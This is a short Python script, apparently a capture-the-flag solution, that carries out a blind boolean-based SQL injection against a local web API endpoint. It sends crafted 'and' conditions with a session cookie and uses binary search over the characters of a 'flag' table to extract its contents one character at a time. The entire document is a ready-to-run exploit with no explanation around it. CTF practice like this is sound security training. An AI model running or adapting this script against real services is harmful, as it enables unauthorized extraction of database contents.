from requests import get
from urllib.parse import quote

host = "http://localhost:31337"
endpoint = "/api/checkEligibility/"
token = "JWT_Token"

def oracle(payload):
    final_payload = f"1 and {payload}"
    res = get(host + endpoint + quote(final_payload), headers={"Cookie": f"session={token}"})
    return "true" in res.text


dumpdata = ""
count = 0
while "}" not in dumpdata:
    low = 32
    high = 127
    mid = 0
    while True:
        mid = (low + high) // 2
        if oracle(f"(select unicode(substr(flag, {count + 1}, 1)) FROM flag) > {mid}"):
            low = mid + 1
        elif oracle(f"(select unicode(substr(flag, {count + 1}, 1)) FROM flag) < {mid}"):
            high = mid - 1
        elif oracle(f"(select unicode(substr(flag, {count + 1}, 1)) FROM flag) = {mid}"):
            dumpdata += chr(mid)
            count += 1
            print("dumped data:", dumpdata)
            break